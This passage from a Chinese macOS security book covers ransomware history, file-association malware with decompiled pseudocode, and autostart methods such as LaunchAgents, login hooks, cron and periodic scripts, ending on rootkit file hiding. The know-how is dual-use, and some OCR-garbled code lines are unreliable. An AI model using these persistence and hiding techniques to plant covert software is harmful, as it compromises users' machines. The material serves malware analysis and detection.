KeRanger是macOS系统上的首款勒索软件，爆发于2016年3月。它的感染源甚是可怕，来源于App Store中的下载软件Transmission。感染后的Transmission软件拥有正常的苹果公司颁发的证书签名，下载它的用户会在不知不觉中感染这款病毒。KeRanger运行后，会对用户系统进行加密，用户将无法正常使用电脑，KeRanger趁机勒索用户，要求受害者支付1个比特币到特定地址才能赎回他们的文件。后来经过安全专家分析，这款恶意软件移植于勒索软件Linux.Encoder，而后者在加密过程中存在漏洞，可以找到直接解密文件的方法。

#### 12.1.2 安全漏洞

从2001年苹果公司推出Mac OS X系统以来，安全漏洞就没有断过。图12-1是知名CVE漏洞收集平台关于苹果macOS桌面系统从1999年到2016年的漏洞分布图 $ ^{①} $。

 </div>

图中显示，这17年间一共出现了1663个漏洞。漏洞的年限分布图如图12-2所示，漏洞的类型分布图如图12-3所示。

 </div>

 </div>

从分布图可以看出，2015年与2016年是漏洞的爆发年。漏洞的类型主要是拒绝服务（Denial of Service）、代码执行（Execute Code）、溢出（Overflow）与内存破坏（Memory Corruption）这4种。2015年发布了macOS 10.11版本，该版本加入了多个新的安全特性。同时，2015年也是移动互联网与移动安全火爆的一年，这一年漏洞爆发与安全行业对苹果系统的关注度提高有着极大的关系，有人将这一年戏称为“漏洞年”。从苹果公司公开的漏洞提交者信息可以看出，很多重量级的漏洞在这一年都是由中国知名安全公司或个人提交的。到了2016年，苹果的安全机制更加完善，系统的漏洞挖掘难度增高，出现的漏洞数量比往年少了一半。以后随着系统安全机制的逐步完善，系统的安全漏洞势必更难挖掘。

#### 12.1.3 安全软件

目前，苹果系统的受众在国内并不多，使用安全软件的人员更是寥寥无几，但这并没有阻止恶意软件给系统带来破坏。对于没有系统安全知识与良好电脑使用习惯的用户，安装杀毒软件是一种不错的选择。

2014年以后，国内安全厂商与研究人员对苹果系统的安全关注度有了显著的提高，几大安全厂商都在苹果桌面系统上发布了自家的杀毒软件，连Google这样的非安全类公司都为macOS开发了Santa安全软件。因此，建议读者根据自己的兴趣爱好，选择合适的安全软件。即使你是拥有专业安全知识的用户，对待安全的态度也不能怠慢。安全无小事，一不小心的安全事件，极有可能会带来难以估量的损失。

### 12.2 文件关联技术

文件关联型病毒是一种比较常见的恶意软件，最早始于Windows平台。一旦计算机中了该类型病毒，当双击打开特定扩展名的文档时，会自动激活运行病毒程序。

文件的扩展名是一种系统级别约定俗成的规范。多年来，计算机系统将不同类型的文件使用扩展名作为快速标识手段，一些通用的文档在不同的操作系统中都可以识别打开。比如同一份docx文件，在安装了Office办公软件的Windows/Android/iOS/macOS系统上，都可以打开浏览，进行编辑操作，这得益于系统级别的文档扩展名的关联与管理。

当前主流的操作系统为了向软件开发商提供自定义文件格式的支持，都会引入文件关联这一概念。在Windows系统上，使用注册表来记录保存不同类型的文件扩展名，每一种类型的文件关联都会在注册表中有一个文件关联项，当用户双击系统中某一文件时，系统会在注册表中查找它的启动程序，并调用该程序指定的命令行参数来启动它。如果没有找到启动程序，系统会弹出提示框让用户手动定位启动程序的位置。Windows平台的所有用户的文件关联保存在HKEY_LOCAL_MACHINE\Software\Classes 下，当前用户的文件关联则保存在HKEY_CURRENT_USER\Software\Classes 下。每种文件的关联都是一个以文件类型命名的注册表项，因

此,怀疑系统是否中了某种指定文件的关联型病毒时,可以定位注册表的文件关联项来查找异常。在主流的Linux如Ubuntu系统上,文件关联则使用一个.desktop文件来记录,该文件是一个ini格式的文本文件,如下所示:

[Desktop Entry]
Encoding=UTF-8 //字符编码
Name=vim //名称
MimeType=text/plain; //类型
Exec=vim %f //运行的程序 %f表示一个参数
Type=Application //类型
Terminal=true //是否使用终端
NoDisplay=true //是否显示在gnome菜单里

其中，MimeType指定了要关联的文件类型，系统预定义了一些常见的文件类型，它们被存储在/usr/share/mime目录下，所有的应用程序都可以使用这些信息。

苹果系统使用文件类型注册的方式来实现文件关联，应用程序在Info.plist文件中设置需要关联的文件类型。一个典型的设置了文件关联的Info.plist文件内容如下：

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AppleDockMenu</key>
<string>DockMenu</string>
<key>BuildMachineOSBuild</key>
<string>15G31</string>
<key>CFBundleDevelopmentRegion</key>
<string>zh_CN</string>
<key>CFBundleDocumentTypes</key>
<array>
<dict>
<key>CFBundleTypeExtensions</key>
<array>
<string>torrent</string>
</array>
<key>CFBundleTypeIconFile</key>
<string>torrent.icns</string>
<key>CFBundleTypeName</key>
<string>ThunderTorrent</string>
<key>CFBundleTypeRole</key>
<string>Editor</string>
<key>NSPersistentStoreTypeKey</key>
<string>NSXMLStoreType</string>
</dict>
</array>
... ...
<key>NSMainNibFile</key>
<string>MainMenu</string>
<key>NSPrincipalClass</key>
<string>XLApplication</string>

</dict>

</plist>

以上是下载软件Thunder的info.plist文件。其中，设置文件关联通过设置CFBundleDocument-Types键来完成，它是一个array数组，表示所有需要注册的文件类型，其中的每一项都是一个dict类型，通过CFBundleTypeExtensions指定要注册的文件扩展名。这里注册的是torrent，也就是bt种子文件，CFBundleTypeIconFile指定了该文件类型在系统Finder中显示的图标，CFBundle-TypeRole指定了程序对这种类型文件的权限，可选值有Editor与Viewer，分别表示编辑与查看的权限。

文件关联设置好以后，在Finder中双击注册过关联的文件，就会调用程序来打开该文件。打开的权限是上面提到的CFBundleTypeRole设置的，打开的动作通过实现NSApplicationDelegate类的application(_:openFile:)方法来处理，它的Swift定义如下：

optional func application(_ sender: NSApplication, openFile filename: String) -> Bool

传入的参数openFile就是要打开的文件的完整路径，在实际分析文件关联程序的时候，可以直接在反汇编窗口中查看该方法的实现，或者对该方法下断点单步跟踪。

恶意软件Mac File Opener是文件关联型病毒的典型，中了该病毒的电脑，系统中大多数扩展名的文件都会被它注册关联，它的Info.plist文件如图12-4所示。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>⑩</td><td style='text-align: center; word-wrap: break-word;'>⑪</td><td style='text-align: center; word-wrap: break-word;'>⑫</td><td style='text-align: center; word-wrap: break-word;'>⑬</td><td style='text-align: center; word-wrap: break-word;'>⑭</td><td style='text-align: center; word-wrap: break-word;'>⑮</td><td style='text-align: center; word-wrap: break-word;'>⑯</td><td style='text-align: center; word-wrap: break-word;'>⑰</td><td style='text-align: center; word-wrap: break-word;'>⑱</td><td style='text-align: center; word-wrap: break-word;'>⑲</td><td style='text-align: center; word-wrap: break-word;'>⑳</td><td style='text-align: center; word-wrap: break-word;'>㉑</td><td style='text-align: center; word-wrap: break-word;'>㉒</td><td style='text-align: center; word-wrap: break-word;'>㉓</td><td style='text-align: center; word-wrap: break-word;'>㉔</td><td style='text-align: center; word-wrap: break-word;'>㉕</td><td style='text-align: center; word-wrap: break-word;'>㉖</td><td style='text-align: center; word-wrap: break-word;'>㉗</td><td style='text-align: center; word-wrap: break-word;'>㉘</td><td style='text-align: center; word-wrap: break-word;'>㉙</td><td style='text-align: center; word-wrap: break-word;'>㉚</td><td style='text-align: center; word-wrap: break-word;'>㉛</td><td style='text-align: center; word-wrap: break-word;'>㉜</td><td style='text-align: center; word-wrap: break-word;'>㉝</td><td style='text-align: center; word-wrap: break-word;'>㉞</td><td style='text-align: center; word-wrap: break-word;'>㉟</td><td style='text-align: center; word-wrap: break-word;'>㉟</td><td style='text-align: center; word-wrap: break-word;'>㉟</td><td style='text-align: center; word-wrap: break-word;'>㉟</td></tr></table>

 </div>

可以看到，该程序注册了232个文件关联，几乎包含了所有的常见文件类型。在本机上创建一个ithmb文件，取名为123.ithmb，然后在文件上右键菜单，定位到Open With一项，可以看到文件的打开程序默认就是Mac File Opener。在文件中右键选Get Info，查看文件的详情，如图12-5所示。

 </div>

在Open with一栏，同样可以看到文件被Mac File Opener关联了。该程序关联了这么多文件类型，看看它的application(_:openFile:)方法是如何处理的，打开Hopper，拖入程序并定位到该方法，伪代码如下：

char -[AppDelegate application:openFile:](void * self, void * _cmd, void * arg2, void * arg3) {
    var_8 = self;
    var_20 = arg3;
    NSLog(@"into openFile");
    if (var_20 != 0x0) {
        [var_8 setFileName:var_20];
        var_28 = [[var_8名称名称] lastPathComponent];
        if ([var_28 pathExtension] isEqualToString：《》《》 == 0x0) {
            var_28 = [var_28 pathExtension];
        }
        [var_8 setExtension:var_28];
        NSLog(@"File=%@", var_20);
        [var_8 makeFileRelatedFunctions];
    }
    rax = sign_extend_64(0x1);
    return rax;
}

关键的方法是makeFileRelatedFunctions()，继续跟踪，代码如下：

void -[AppDelegate makeFileRelatedFunctions](void * self, void * _cmd) {
    [self performSelectorOnMainThread:@selector(mainFunc) withObject:0x0 waitUntilDone:0x1];
    return;
}

接着看mainFunc的代码，它实际上调用了hideDockIcon_delayed，后者又调用了hideDockIcon来执行隐藏Dock上图标的操作。

### 12.3 软件自启动技术

自启动技术可以让软件在系统中不通过人为的方式而自动运行。恶意软件为了保证在目标用户的机器上持久地运行，通常都会使用自启动技术。在Windows平台，随着病毒与反病毒技术的对抗升级，自启动技术也在不停地更新换代。最初Windows平台的恶意软件通过使用注册表的启动项来实现自启动，但这种方式不够隐蔽，非常容易被查杀。不久，恶意软件将目光放到了浏览器插件身上，它们将自身伪装成浏览器插件，中了这种病毒的系统，用户启动浏览器时就会激活恶意软件。相对使用注册表的方式，这种方式要隐蔽得多，并且更难查杀。后来，有恶意软件通过文件感染的方式来实现自启动，这种方式对系统的破坏性大，会修改篡改系统中的可执行文件，属于破坏性的病毒。现在，恶意软件的自启动技术更加隐蔽，通过内核驱动来实现。诸如此类的还有无模块加载、系统进程注入等，查杀难度指数节节升高。

从Windows系统恶意软件自启动方案可以看出，自启动技术最开始是使用系统提供的开机启动方案，后来则是插件式、内核式启动，是一种从上到下、从外到内的线性路径。苹果系统有一套独立的开机启动与其他自启动方法，下面我们一一介绍。

#### 12.3.1 Launch Items

Launch Items又称为系统开机项，类似于Windows平台上注册表的开机启动项，不过前者是使用plist文件配置的，并且存于系统的特定目录中。苹果系统内置的一种称为Launch Daemon/Agent的机制来实现系统启动时自动执行脚本程序，从10.4版本开始，采用launchd进程来管理整个操作系统的服务及进程。它的启动服务称为Launch Daemon/Agents，利用该服务可以使脚本程序在系统启动的时候在后台运行。

Launch Items又可称为开机服务项，分为Launch Daemon与Launch Agents，它们之间的区别在于，前者在开机时会加载，后者在用户登录后才会加载。它们存放于系统的如下位置：

□ ~/Library/LaunchAgents
□ /Library/LaunchAgents
□ /Library/LaunchDaemons
□ /System/Library/LaunchAgents
□ /System/Library/LaunchDaemons

/System开头的路径保存的是系统使用的开机项，通常用户不去接触。打开任意一个开机启动项文件，内容如下：

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC --//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Disabled</key>
<false/>
<key>KeepAlive</key>
<true/>
<key>Label</key>
<string>com.teamviewer.desktop</string>
<key>LimitLoadToSessionType</key>
<array>
<string>LoginWindow</string>
<string>Aqua</string>
</array>
<key>ProgramArguments</key>
<array>
<string>/Applications/TeamViewer.app/Contents/Helpers/TeamViewer_Desktop</string>
<string>-RunAsAgent</string>
<string>YES</string>
<string>-Module</string>
<string>Full</string>
</array>
<key>RunAtLoad</key>
<true/>
<key>WorkingDirectory</key>
<string>/Applications/TeamViewer.app/Contents/Helpers</string>
</dict>
</plist>

下面简要介绍每一项的含义。

☐ Disabled: 是否禁用启动项。false表示不禁用，禁用的启动项可以手动加载。

KeepAlive: 设置可执行文件是持续运行，还是满足具体条件之后再启动。默认值为false，值为ture时，表明无条件地启动可执行文件，并使之保持在整个系统运行周期内。

☐ Label: 开机服务项的名称，使用Java式包名的反域名法命名。

□ LimitLoadToSessionType: 限制加载会话类型。它的取值有 Aqua、StandardIO、Background 与 LoginWindow。Aqua 表示拥有访问所有 GUI 服务的权限，类似于下面要介绍的 Login Items。

ProgramArguments：执行的命令参数列表。同样的还有Program，表示没有参数的命令完整路径，这两者必须要设置其中一个的值。

☐ RunAtLoad：是否在加载完后直接运行。

☐ WorkingDirectory：指定当前工作目录的路径。

Launch Items的管理可以使用命令行工具launchctl，它可以启动、停止、移除、限制与枚举服务，例如启动TeamViewer的命令如下：

停止TeamViewer的命令如下：

$ launchctl list | grep team
82862 0 com.teamviewer.teamviewer
$ launchctl stop com.teamviewer.teamviewer

系统使用launchd来内部管理这些服务项，但从macOS 10.10与iOS 8开始，launchd的代码移入了libχpc，不再开源。对launchd原理有兴趣的读者可以参考早期版本的openlaunchd $ ^{①} $或者最新版本的relaunchd $ ^{②} $，来了解这种系统Deamon的运行机制。

#### 12.3.2 Login Items

Login Items是登录后的启动项，只对当前登录的用户有效。它允许用户通过Preferences面板手动配置。点击Dock上的System Preferences→Users & Groups，选择当前用户，在主界面上点击Login Items，会列出当前用户登录成功后自动运行的程序列表，如图12-6所示。

 </div>

配置好的Login Items本地保存在~/Library/Preferences/com.apple.loginitems.plist文件中，它是一个编译过的二进制格式plist，可以执行以下命令查看它的内容：

<dict>
    <key>SessionItems</key>
    <dict>
        <key>CustomListItems</key>
        <array>

<dict>
    <key>Alias</key>
    <data>
        ...
        </data>
        <key>Name</key>
        <string>CheatSheet</string>
        <key>CustomItemProperties</key>
        <dict>
            <key>com.apple.LSSharedFileList.Binding</key>
            <data>
                ...
            </data>
        </dict>
        <key>CustomItemProperties</key>
        <dict>
            <key>com.apple.LSSharedFileList.Binding</key>
            <data>
                ...
            </data>
            <key>com.apple.loginitem.HideOnLaunch</key>
            <true/>
            <key>com.apple.LSSharedFileList.ItemIsHidden</key>
            <true/>
        </dict>
        <key>Name</key>
        <string>iTunesHelper</string>
        <key>Flags</key>
        <integer>1</integer>
        <key>Alias</key>
        <data>
            ...
            </data>
        </dict>
    </array>
    <key>Controller</key>
    <string>CustomListItems</string>
</dict>

每一个启动项都使用一个dict表示。其中，Name指定要启动的程序名，CustomItemProperties指定自定义项目属性，目前只有com.apple.LSSharedFileList.Binding一项，它的值Base64解码后可以看到，里面记录了可执行文件的完整路径。

#### 12.3.3 StartupItems

StartupItems即系统启动时运行的项目，可以是运行完就立即终止的程序，也可以是一直在系

统中持续运行的后台进程。StartupItems主要存放在以下两个目录中。

□ /System/Library/StartupItems；系统相关的StartupItems，提供了系统级别的服务，用户一般不关心该目录。

☐ /Library/StartupItems：用户安装的StartupItems，该目录默认不存在，由用户创建生成。

StartupItems不同于Bundle结构的目录, 它有着自己的文件组织规范。它典型的目录结构如下:

MyStartupItem/
|
|- MyStartupItem
\- StartupParameters.plist

MyStartupItem表示需要执行的可执行文件或脚本, StartupParameters.plist则为依赖关系的plist文件。拿笔者本机的TuxeraNTFSUnmountHelper来说, StartupParameters.plist文件内容如下:

$ cat /Library/StartupItems/TuxeraNTFSUnmountHelper/StartupParameters.plist
{
    Description = "Tuxera NTFS unmount helper";
    Uses = ("Disks");
    Messages = {
        start = "Starting Tuxera NTFS unmount helper...";
        stop = "Stopping Tuxera NTFS unmount helper...";
    };
}

☐ Description: 表示对该启动项的简单描述。

☐ Uses: 指定了在StartupItems加载之前需要开启的服务。

☐ Messages：启动与停止时输出的消息。

除此之外，还有以下几项。

□ Provides：指定StartupItems提供的服务名。Provides可以指定多个服务，但通常一个StartupItems设置一个名称就好。

☐ Requires: 启动StartupItems时的依赖的服务项，在启动StartupItems时，依赖项必须处于运行状态，否则，当前StartupItems启动项会失败。

OrderPreference: 指定执行StartupItems的时间顺序。取值包括First、Early、None(default)、Late、Last。

StartupItems的可执行脚本也有着自己的编写规范,本机的TuxeraNTFSUnmountHelper文件如下:

#!/bin/sh

./etc/rc.common

StartService() {
    return 0
}

StopService() {
    killall -SIGUSR1 tuxera_ntfs_daemon
    return 0
}

RestartService() {
    return 0
}

RunService "$1"

此处的可执行文件是一个Shell脚本，它最开始包含了/etc/rc.common文件，该脚本包含了通用的环境变量设置与一些函数定义，接下来的脚本文件内容包含了3个方法：StartService()、StopService()、RestartService()，分别定义了服务在启动、停止与重启时执行的内容，最后是调用RunService来启动服务。

同样，可以看出，这种启动方式也是极容易被发现与清除的。

#### 12.3.4 Login/Logout Hooks

Login/Logout Hooks又称为登录/登出钩子，这种自启动方式依赖于苹果的defaults系统，使用方法很简单，执行以下命令即可：

sudo defaults write com.apple.loginwindow LoginHook scripts_file
sudo defaults write com.apple.loginwindow LogoutHook scripts_file

Hook登录使用LoginHook，Hook系统退出使用LogoutHook。查看Login/Logout Hooks可以执行以下命令：

sudo defaults read com.apple.loginwindow LoginHook
sudo defaults read com.apple.loginwindow LogoutHook

删除则执行以下命令：

sudo defaults delete com.apple.loginwindow LoginHook
sudo defaults delete com.apple.loginwindow LogoutHook

这种自启动方式的局限是显而易见的，它只支持同时指定一个登录与登出的钩子。最后，这种方式的自启动配置保存在~/Library/Preferences/com.apple.loginwindow.plist文件中，可以使用plistutil直接查看它的内容。

### 12.3.5 Cron Jobs

Cron Jobs是定制任务计划（作业）。任务计划指的是按照某种约定制定的软件执行流程，它是传统BSD操作系统使用较多的自动化任务实施方式，在苹果系统中也可以使用。制定任务计划需要配置支持执行任务计划的用户以及任务计划的内容。

首先，配置可以允许执行任务计划的用户，执行以下命令查看Cron Jobs目录的配置信息：

$ ls /usr/lib/cron
at.deny cron.deny spool tmp
cron.allow jobs tabs

□ at.deny/at.allow: at.deny文件保存拒绝执行at与batch方式操作作业的用户，at.allow则保存允许操作的用户，每个用户名占一行。

□ cron.deny/cron.allow: cron.deny文件保存拒绝执行Cron Jobs的用户，cron.allow则记录了允许的用户。

□ jobs：保存了at与batch方式创建的作业内容。

☐ tabs：保存了Cron Jobs的内容。

如果没有deny与allow文件，可以手动建立，然后将需要执行作业的用户（比如当前用户）保存到相应的文件中。

比如要添加一个任务计划，要求在每天下午13点23分执行一次系统的计算器程序，那么就可以进行以下操作。

首先，编辑任务计划的内容，执行以下命令：

$ crontab -e
23 13 * * * /Applications/Calculator.app/Contents/MacOS/Calculator

23指的是23分，13点指的是小时，后面3个星号是通配符，表示日期是每一天，最后面跟的是作业要执行的文件。任务作业有着自己的一套完整语法，下面展示几个不同的用法：

*/15 * * * /opt/test.sh //每15分钟就执行一次/opt/test.sh脚本
0 13-16 * * * /opt/test.sh //在13点到16点的每个整点执行一次/opt/test.sh脚本
0 13,16 * * * /opt/test.sh //在13点与16点的整点执行一次/opt/test.sh脚本
0 13,16 22 * * /opt/test.sh //每个月22号的13点与16点的整点执行一次/opt/test.sh脚本
0 13,16 22 9 * /opt/test.sh //每年的9月22号的13点与16点的整点执行一次/opt/test.sh脚本
23 13 * * * 0 /opt/test.sh //每周的星期日13点23分执行一次/opt/test.sh脚本

更多更详细的使用方法，可以参看苹果官方的开发文档。

在编辑模式下输入完内容，然后输入“:wq”保存退出。接下来可以执行crontab -l查看添加的计划任务。

添加成功的任务计划会在/usr/lib/cron/tabs目录下创建一个用户名命令的任务计划文件，可以执行cat命令查看，如下所示：

$ sudo cat /usr/lib/cron/tabs/macbook
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.mc0lid6j2m installed on Sun Sep 18 13:22:22 2016)
# (Cron version -- $FreeBSD: src/usr.sbin/cron/crontab/crontab.c,v 1.24 2006/09/03 17:52:19 ru Exp $)
23 13 * * /Applications/Calculator.app/Contents/MacOS/Calculator

编辑好任务计划后，系统就会按指定的规则来执行任务了。

#### 12.3.6 Periodic Scripts

Periodic Scripts也属于任务计划，主流的Unix系统都支持，不过它不能像Cron Jobs那样进行细粒度的控制，只提供了daily、monthly、weekly这3种任务计划，分别表示每天、每月、每周执行一次。它们通常用来执行一些频率较低的系统清理工作，当然，也可以被恶意软件拿来做自启动之用。

这3种任务计划分别保存在/etc/periodic/的3个目录中，执行以下命令可以查看所有任务计划的内容：

$ tree /etc/periodic/
/etc/periodic/
daily
110.clean-tmp
130.clean-msg
140.clean-rwho
199.clean-fax
310.accounting
400.status-disks
420.status-network
430.status-rwho
999.local
monthly
199.rotate-fax
200.accounting
999.local
weekly
320.whatis
999.local

系统会在合适的时机执行这些脚本，用户不需要手动干预，不过系统也提供了手动运行它们的方法，执行以下命令即可：

sudo periodic daily weekly monthly

调用periodic命令，传入要执行的任务计划的类型即可。也可以像上面这样，一次执行全部。创建自定义的Periodic Scripts也很简单。以打开系统的计算器程序为例，编写如下的内容：

#!/bin/sh
open -n /Applications/Calculator.app/Contents/MacOS/Calculator
exit 0

将脚本命名为 “123.run-calc”，并将它放入/etc/periodic/daily/目录下即可。这样系统会在合适的时间启动它，当然也可以直接调用sudo periodic daily手动地执行它。

#### 12.3.7 Authorization Plugins

Authorization Plugins称为验证插件。苹果系统将系统中的权限验证设计成一种抽象的验证请

求接口，比如，磁盘解锁、家庭控制、登录窗口、重启验证等。不同的应用场景使用不同的验证插件，同时，系统提供了开发接口，供第三方开发人员开发自己的验证插件。

验证插件机制从系统10.4版本引进，在10.5版本后，第三方开发的验证插件必须保存在/Library/Security/SecurityAgentPlugins目录下，系统使用的插件必须保存在/System/Library/CoreServices/SecurityAgentPlugins目录下。以下是系统中使用的插件列表：

Total 0
drwxr-xr-x 3 root wheel 102 Aug 23 2015 DiskUnlock.bundle
drwxr-xr-x 3 root wheel 102 Aug 28 2015 FamilyControls.bundle
drwxr-xr-x 3 root wheel 102 Aug 23 2015 HomeDirMechanism.bundle
drwxr-xr-x 3 root wheel 102 Aug 23 2015 KerberosAgent.bundle
drwxr-xr-x 3 root wheel 102 Aug 23 2015 MCXMechanism.bundle
drwxr-xr-x 3 root wheel 102 Aug 23 2015 PKINITMechanism.bundle
drwxr-xr-x 3 root wheel 102 Aug 23 2015 RestartAuthorization.bundle
drwxr-xr-x 3 root wheel 102 Aug 23 2015 loginKC.bundle
drwxr-xr-x 3 root wheel 102 Aug 23 2015 loginwindow.bundle

第三方开发的验证插件会在第三方验证请求发生时调用，不过由于它只能安装在/Library/Security/SecurityAgentPlugins目录中，因此，这类恶意软件十分好定位，只需要查看该目录的内容即可。以下是笔者机器中该目录的内容：

$ ls -l /Library/Security/SecurityAgentPlugins
total 0
drwxr-xr-x 3 root wheel 102 Jul 6 18:15 TeamViewerAuthPlugin.bundle

可以看到，TeamViewer软件会在系统中安装一个自定义的验证插件。

#### 12.3.8 Browser Extensions

Browser Extensions是浏览器扩展，又称为浏览器插件。在Windows上，恶意软件通过浏览器插件来攻击系统比较常见，而且它们还有个比较牛的名字——“流氓插件”。在2008年左右的中国互联网时期，PC上的信息安全处于野蛮生长的混沌时代，这个时期的“流氓插件”十分流行，几乎席卷了整个中国互联网的个人计算机。因此，研究苹果系统的自启动技术时，浏览器的插件启动方式就需要特别关注，很可能它会成为另一个恶意软件滋生的温床。

主流的浏览器为了丰富自身的功能，都会向第三方提供开发浏览器插件的接口，它们保存插件的目录也不尽相同，比如Chrome浏览器插件的目录为~/Library/Application Support/Google/Chrome/Default/Extensions，Firefox浏览器插件目录为~/Library/Application Support/Firefox/Profiles/xxx.default/extensions，苹果的Safari浏览器插件目录为~/Library/Safari/Extensions。当发现使用异常，怀疑是浏览器所为时，可以定位到这些目录来查找可疑的插件。至于如何鉴定插件是否为恶意插件，可能就需要其他手段了，比如手动地静态分析它的代码。

#### 12.3.9 Spotlight Importers

恶意软件除了使用前面介绍的“传统”手段直接或间接地自启动外，还可以使用一些比较偏门的方式来完成自启动，典型的有Spotlight Importers，也就是Spotlight插件。苹果系统提供了Spotlight服务，允许应用程序向其中注册信息，当用户通过键盘上的control+space或其他方式启动Spotlight进行搜索时，如果程序注册的信息被搜索结果匹配，就会在Spotlight列表中显示出来。用户如果点击这些搜索结果，就会启动程序预先设置好的行为，隐蔽的恶意软件就可能通过这种方式来启动自己。

Spotlight Importers安装在/Library/Spotlight目录下，每个Spotlight Importers都是一个以mdimporter扩展名结尾的Bundle，在查杀恶意软件时，可以留意该目录中是否有可疑的mdimporter文件。

#### 12.3.10 QuickLook Plugins

QuickLook Plugins，也就是快速查看插件，与Spotlight Importers类似。当用户选中一个文件，按下键盘上的空格键时，如果该文件类型提供了快速查看插件，就会执行该插件，为文件提供快速查看功能。这是苹果系统中的一个非常便民且人性化的功能，但它也有可能成为恶意软件自启动的隐蔽场所。

QuickLook Plugins同样有自己存储的目录，位于/Library/QuickLook。编写Spotlight Importers与QuickLook Plugins都有着自己的接口与规范，有兴趣的读者可以参看网上开源的项目来了解如何开发它们，例如qlImageSize $ ^{①} $。

#### 12.3.11 Kernel Extensions

另外一种比较高级的自启动技术就是Kernel Extensions了，它被称为内核扩展，与大家熟悉的Windows平台上的内核驱动是一样的。开发Kernel Extensions比开发一般的应用程序要复杂得多，它要求开发人员有较多的系统底层知识，还需要有好的编码规范与调试能力。如果Kernel Extensions的编写出现Bug，极可能让系统变得不稳定，或者直接宕机，因此在开发时，需要格外小心。

Kernel Extensions也被固定安装在特定的目录中，系统使用的保存在/System/Library/Extensions目录下，第三方用户开发的保存在/Library/Extensions目录下。判断Kernel Extensions是否具有恶意性质的方法有3种，一是查看它是否具有可信机构或开发商的程序签名；另外是通过在网络上搜索它的模块名，查看是否有过该模块的详细信息；最后也是最直接的方法，就是手动逆向分析它的代码。

### 12.4 Rootkit

Rootkit是一种特殊的恶意软件，它的特殊性不在于它有多大的破坏能力，而是它的隐蔽性。在系统中隐藏自身是Rootkit的最主要功能，它通常被当作一个后门软件常驻在用户系统中。一个全方位功能齐全的Rootkit的隐藏功能包含：多系统兼容与支持、文件隐藏、内核模块隐藏、进程隐藏、网络通讯端口隐藏、添加隐藏用户、Root权限提升等功能。

由于系统API的限制，在苹果系统上，用户层的Rootkit目前几乎不存在。绝大多数的Rootkit要想完成隐藏功能，都需要开发特定功能的系统内核模块。目前Rootkit主要是基于内核层面的，开发Rootkit软件需要掌握相应的内核调试手段与内核模块开发技术。基于内核模块的隐藏技术强烈依赖于系统底层对象的内核数据结构，每一次系统升级都可能带来内核数据结构的变化。在上一个版本中运行良好的Rootkit，到了新的系统中可能就不能正常工作了，Rootkit的兼容性比起普通应用程序要复杂且重要得多，一点点不兼容的逻辑代码都可能会使新系统变得不稳定，因此，多系统兼容与支持对Rootkit来说是非常重要的。

#### 12.4.1 文件隐藏

文件隐藏是Rootkit最基本的功能之一，几乎任何一个商业级的Rootkit都会带有此功能。文件隐藏直观的效果是用户在Finder与命令行终端执行ls命令时，无法看到Rootkit或指定的文件。从技术上讲，列举文件功能对于系统以及绝大多数软件来说，底层都是调用系统提供的API接口，这些API底层最终通过系统调用的形式来完成功能的调用。系统调用是POSIX系统提供的一套统一的底层接口，供上层API与系统底层资源进行通信，可以根据API的调用来证实这一点。POSIX系统通常会提供一个strace命令供用户监视系统调用，但苹果系统中并没有此命令，也没有相关的移植版本的实现，可以使用另一种替代方案dtruss。dtruss原理上是用Dtrace来完成系统调用的Hook，执行dtruss -f machofilename就可以列出machofilename文件执行的所有系统调用列表。监视ls命令输出如下：

$ sudo dtruss -f /bin/ls
Password:
dtrace: failed to execute /bin/ls: dtrace cannot control executables signed with restricted entitlements

系统限制级的应用是无法直接这样Hook的，不过有一种比较取巧的方法：Rootless限制程序的运行是通过目录而不是具体的文件，因此只需要将1s命令复制到其他目录，然后执行即可：

$ sudo dtruss -f ~/Program/ls /Applications/
Password:
ddmbp:~ android$ sudo dtruss -f ~/Program/ls /Applications/
Iceberg.app WinZip.app Kindle.app Xamarin Studio.app KnockKnock.app Xcode.app
PID/THRD SYSCAL(args) = return
48104/0x24f63f: thread_selfid(0x0, 0x0, 0x0) = 24223350

48104/0x24f63f: csops(0x0, 0x0, 0x7FFF5DF85830) = 00
48104/0x24f63f: issetugid(0x0, 0x0, 0x7FFF5DF85830) = 00
48104/0x24f63f: shared_region_check_np(0x7FFF5DF83738, 0x0, 0x7FFF5DF85830) = 00
48104/0x24f63f: stat64("/usr/lib/dtrace/libdtrace_dyld.dylib\0", 0x7FFF5DF84CC8, 0x7FFF5DF85830) = 00
48104/0x24f63f: open("/usr/lib/dtrace/libdtrace_dyld.dylib\0", 0x0, 0x0) = 30
48104/0x24f63f: pread(0x3, "\\312\\376\\272\\276\\0", 0x1000, 0x0) = 40960
48104/0x24f63f: pread(0x3, "\\317\\372\\355\\376\\a\\0", 0x1000, 0x1000) = 40960
48104/0x24f63f: fcntl(0x3, 0x61, 0x7FFF5DF83010) = 00
48104/0x24f63f: mmap(0x0, 0x670, 0x5, 0x1, 0x3, 0x1000) = 0x101C840000
48104/0x24f63f: munmap(0x101C84000, 0x670) = 00
48104/0x24f63f: mmap(0x101C8A000, 0x2000, 0x5, 0x12, 0x3, 0x1000) = 0x101C8A0000
48104/0x24f63f: mmap(0x101C8C000, 0x1000, 0x3, 0x12, 0x3, 0x3000) = 0x101C8C0000
48104/0x24f63f: mmap(0x101C8D000, 0x2F40, 0x1, 0x12, 0x3, 0x4000) = 0x101C8D0000
48104/0x24f63f: close(0x3) = 00
48104/0x24f63f: stat64("/usr/lib/dtrace/libdtrace_dyld.dylib\0", 0x7FFF5DF85248, 0x1) = 00
48104/0x24f63f: ioctl(0x3, 0x80086804, 0x7FFF5DF85678) = 00
48104/0x24f63f: close(0x3) = 00
48104/0x24f63f: sysctl(0x7FFF5DF84D10, 0x2, 0x7FFF5DF84D20) = 00
48104/0x24f63f: issetugid(0x101C85000, 0x88, 0x1) = 00
48104/0x24f63f: getpid(0x101C85000, 0x88, 0x1) = 481040
48104/0x24f63f: stat64("/AppleInternal/XBS/.isChrooted\0", 0x7FFF5DF84C78, 0x1) = -1 Err#2
48104/0x24f63f: stat64("/AppleInternal\0", 0x7FFF5DF84BE8, 0x1) = -1 Err#2
48104/0x24f63f: csops(0xBBE8, 0x7, 0x7FFF5DF84700) = 00
